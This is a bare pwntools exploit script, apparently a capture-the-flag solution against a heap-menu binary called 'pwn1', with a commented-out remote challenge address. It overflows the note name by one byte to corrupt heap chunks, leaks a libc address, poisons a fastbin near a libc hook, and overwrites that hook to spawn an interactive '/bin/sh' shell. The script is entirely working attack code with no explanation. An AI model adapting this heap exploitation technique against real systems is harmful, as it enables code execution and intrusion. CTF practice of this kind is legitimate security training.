from pwn import *

context.log_level="debug"
def new(size):
   p.sendlineafter(".exit\n","1")
   p.sendlineafter("size\n",str(size))

def delete():
   p.sendlineafter(".exit\n","2")

def show():
   p.sendlineafter(".exit\n","3")

def fake(note):
   p.sendlineafter(".exit\n","4")
   p.sendafter("name\n",note)

def edit(note):
   p.sendlineafter(".exit\n","5")
   p.sendafter("note\n",note)
p=process("./pwn1")
#p=remote("39.106.184.130",8090)
p.sendafter("name\n","kirin\n")
new(0x98)
new(0x18)
fake("a"*0x30+"\x10")
delete()
new(0x18)
#leak main_arena
fake("a"*0x30+"\x30")
show()
libc_addr=u64(p.recv(6)+"\x00\x00")+0x7ffff7a0d000-0x7ffff7dd1b78
new(0x58)
delete()
new(0x68)
delete()
new(0x18)
new(0x98)
new(0x10)
#gdb.attach(p)
fake("a"*0x30+"\x40")
delete()
new(0x10)
fake("a"*0x30+"\x60")
edit("a"*8+p64(libc_addr+0x3c67a8-0x40-0x10))
new(0x78)
new(0x68)
delete()
new(0x58)
fake("a"*0x30+"\xd0")
edit(p64(libc_addr+0x3c67a8-0x43))
new(0x68)
new(0x68)
edit("/bin/sh"+"\x00"*(0x33-7)+p64(libc_addr+0x45390))
delete()
#gdb.attach(p)
p.interactive()
